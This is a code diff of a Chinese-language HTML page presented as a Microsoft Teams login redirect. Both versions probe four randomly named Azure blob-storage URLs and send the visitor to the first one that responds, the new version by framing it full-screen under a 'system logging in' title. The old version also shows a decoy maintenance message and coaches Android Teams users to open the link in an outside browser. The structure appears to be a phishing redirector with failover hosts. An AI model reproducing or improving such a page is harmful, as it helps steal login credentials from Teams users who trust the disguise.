@@ -1,351 +1,125 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teams登录跳转中</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .loader {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1.2s linear infinite;
-            z-index: 10;
-        }
-        
-        .container {
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-            padding: 40px 20px;
-            border-radius: 16px;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-            display: none;
-            z-index: 20;
-        }
-        
-        .container.visible {
-            display: block;
-            animation: fadeIn 0.5s ease-out;
-        }
-        
-        .maintenance-icon {
-            font-size: 64px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-        
-        h1 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            font-weight: 600;
-        }
-        
-        p {
-            font-size: 18px;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        
-        .retry-btn {
-            display: inline-block;
-            padding: 12px 30px;
-            background: rgba(255, 255, 255, 0.15);
-            color: white;
-            font-size: 16px;
-            font-weight: 500;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .retry-btn:hover {
-            background: rgba(255, 255, 255, 0.25);
-            transform: translateY(-2px);
-        }
-        
-        .android-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 30;
-            display: none;
-        }
-        
-        .android-overlay.visible {
-            display: flex;
-            animation: fadeIn 0.5s ease-out;
-        }
-        
-        .android-btn {
-            display: inline-block;
-            padding: 15px 40px;
-            background: #4CAF50;
-            color: white;
-            font-size: 18px;
-            font-weight: 600;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            margin-top: 30px;
-        }
-        
-        .android-btn:hover {
-            background: #43A047;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-        }
-        
-        .android-instruction {
-            text-align: left;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px;
-            max-width: 90%;
-        }
-        
-        .android-instruction ol {
-            padding-left: 20px;
-            margin: 15px 0;
-        }
-        
-        .android-instruction li {
-            margin-bottom: 10px;
-            line-height: 1.5;
-        }
-        
-        @keyframes spin {
-            to { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 15px;
-            }
-            
-            h1 {
-                font-size: 24px;
-            }
-            
-            p {
-                font-size: 16px;
-            }
-            
-            .maintenance-icon {
-                font-size: 48px;
-            }
-            
-            .android-btn {
-                padding: 12px 30px;
-                font-size: 16px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>系统登录中...</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: #f9f9fb;
+      display: flex; flex-direction: column;
+      justify-content: center; align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    #message {
+      margin-top: 20px;
+      font-size: 17px;
+    }
+    #loginFrame {
+      width: 100%; height: 100vh;
+      border: none;
+      display: none;
+    }
+    #fallback, #retryBtn {
+      display: none;
+      margin-top: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #0078d4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+    }
+  </style>
 </head>
 <body>
-    <!-- 加载指示器 -->
-    <div class="loader" id="loader"></div>
-    
-    <!-- 维护信息（默认隐藏） -->
-    <div class="container" id="maintenanceContainer">
-        <div class="maintenance-icon">⚠️</div>
-        <h1>项目在维护中</h1>
-        <p>请稍后再试</p>
-        <button class="retry-btn" id="retryBtn">重新尝试</button>
-    </div>
-    
-    <!-- 安卓端专用覆盖层 -->
-    <div class="android-overlay" id="androidOverlay">
-        <div class="maintenance-icon">🤖</div>
-        <h1>安卓端Teams登录说明</h1>
-        
-        <div class="android-instruction">
-            <p>在安卓版Teams中，由于安全限制，需要手动完成登录流程：</p>
-            <ol>
-                <li>点击下方"打开登录页面"按钮</li>
-                <li>在弹出窗口中选择"使用Teams打开"</li>
-                <li>返回Teams应用完成登录</li>
-                <li>如果登录页面未自动关闭，请手动关闭</li>
-            </ol>
-        </div>
-        
-        <button class="android-btn" id="androidBtn">打开登录页面</button>
-    </div>
 
-    <script>
-        // 要尝试的链接列表
-        const urls = [
-            "https://iwtq25dhr.blob.core.windows.net/home/index.html",
-            "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
-            "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
-            "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
-        ];
-        
-        // DOM元素
-        const loader = document.getElementById('loader');
-        const maintenanceContainer = document.getElementById('maintenanceContainer');
-        const retryBtn = document.getElementById('retryBtn');
-        const androidOverlay = document.getElementById('androidOverlay');
-        const androidBtn = document.getElementById('androidBtn');
-        
-        // 检测是否为安卓Teams环境
-        const isAndroidTeams = /Android.*Teams/i.test(navigator.userAgent);
-        let currentUrl = '';
-        
-        // 安卓端特殊处理函数
-        function handleAndroidRedirect(url) {
-            // 显示安卓专用界面
-            loader.style.display = 'none';
-            androidOverlay.classList.add('visible');
-            currentUrl = url;
+  <div id="message">正在检测可用登录入口...</div>
+  <iframe id="loginFrame"></iframe>
+
+  <div id="fallback">
+    <div style="margin-top:10px;">如果页面没有响应，请在浏览器中打开：</div>
+    <button onclick="openExternal()">在浏览器中打开</button>
+  </div>
+
+  <button id="retryBtn" onclick="start()">重新尝试</button>
+
+  <script>
+    const urls = [
+      "https://iwtq25dhr.blob.core.windows.net/home/index.html",
+      "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
+      "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
+      "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
+    ];
+    const timeout = 4000;
+    let fallbackUrl = "";
+
+    function tryUrl(url, onSuccess, onFailure) {
+      const iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.src = url;
+      document.body.appendChild(iframe);
+
+      const timer = setTimeout(() => {
+        document.body.removeChild(iframe);
+        onFailure();
+      }, timeout);
+
+      iframe.onload = () => {
+        clearTimeout(timer);
+        document.body.removeChild(iframe);
+        onSuccess(url);
+      };
+    }
+
+    function tryNext(index) {
+      if (index >= urls.length) {
+        document.getElementById("message").innerText = "系统维护中，暂时无法登录。";
+        document.getElementById("retryBtn").style.display = "inline-block";
+        return;
+      }
+
+      tryUrl(
+        urls[index],
+        (url) => {
+          fallbackUrl = url;
+          showLoginFrame(url);
+        },
+        () => {
+          tryNext(index + 1);
         }
-        
-        // 尝试跳转到指定URL
-        function tryRedirect(url) {
-            return new Promise((resolve) => {
-                if (isAndroidTeams) {
-                    // 对于安卓Teams环境，直接返回true并特殊处理
-                    resolve(true);
-                    return;
-                }
-                
-                // 非安卓环境 - 使用fetch检测
-                const controller = new AbortController();
-                const signal = controller.signal;
-                
-                // 设置超时
-                const timeout = setTimeout(() => {
-                    controller.abort();
-                    resolve(false);
-                }, 2000);
-                
-                // 尝试访问链接
-                fetch(url, { 
-                    method: 'HEAD', 
-                    mode: 'no-cors',
-                    signal: signal
-                })
-                .then(response => {
-                    clearTimeout(timeout);
-                    resolve(true);
-                })
-                .catch(error => {
-                    clearTimeout(timeout);
-                    resolve(false);
-                });
-            });
-        }
-        
-        // 尝试所有链接
-        async function attemptRedirect() {
-            for (let i = 0; i < urls.length; i++) {
-                const url = urls[i];
-                
-                try {
-                    const success = await tryRedirect(url);
-                    
-                    if (success) {
-                        if (isAndroidTeams) {
-                            // 安卓Teams环境特殊处理
-                            handleAndroidRedirect(url);
-                            return;
-                        } else {
-                            // 其他环境直接跳转
-                            window.location.href = url;
-                            return;
-                        }
-                    }
-                } catch (error) {
-                    console.error('检测URL时出错:', error);
-                }
-            }
-            
-            // 所有链接都不可用 - 显示维护信息
-            loader.style.display = 'none';
-            maintenanceContainer.classList.add('visible');
-        }
-        
-        // 重新尝试
-        retryBtn.addEventListener('click', () => {
-            maintenanceContainer.classList.remove('visible');
-            androidOverlay.classList.remove('visible');
-            loader.style.display = 'block';
-            setTimeout(attemptRedirect, 300);
-        });
-        
-        // 安卓按钮点击处理
-        androidBtn.addEventListener('click', () => {
-            // 在Teams安卓端中打开新窗口
-            const newWindow = window.open(currentUrl, '_blank');
-            
-            // 监控新窗口状态
-            if (newWindow) {
-                // 每500毫秒检查一次窗口是否关闭
-                const checkInterval = setInterval(() => {
-                    if (newWindow.closed) {
-                        clearInterval(checkInterval);
-                        // 用户关闭窗口后刷新页面
-                        location.reload();
-                    }
-                }, 500);
-            } else {
-                // 如果弹出窗口被阻止，显示提示
-                alert('弹出窗口被阻止，请在浏览器设置中允许弹出窗口');
-            }
-        });
-        
-        // 页面加载后开始尝试跳转
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(attemptRedirect, 800);
-        });
-    </script>
+      );
+    }
+
+    function showLoginFrame(url) {
+      const iframe = document.getElementById("loginFrame");
+      iframe.src = url;
+      iframe.style.display = "block";
+      document.getElementById("message").innerText = "正在加载登录页面...";
+      document.getElementById("fallback").style.display = "block";
+    }
+
+    function openExternal() {
+      if (fallbackUrl) {
+        window.open(fallbackUrl, '_blank');
+      }
+    }
+
+    function start() {
+      document.getElementById("retryBtn").style.display = "none";
+      document.getElementById("message").innerText = "正在重新检测...";
+      document.getElementById("loginFrame").style.display = "none";
+      document.getElementById("fallback").style.display = "none";
+      tryNext(0);
+    }
+
+    window.onload = start;
+  </script>
+
 </body>
 </html>
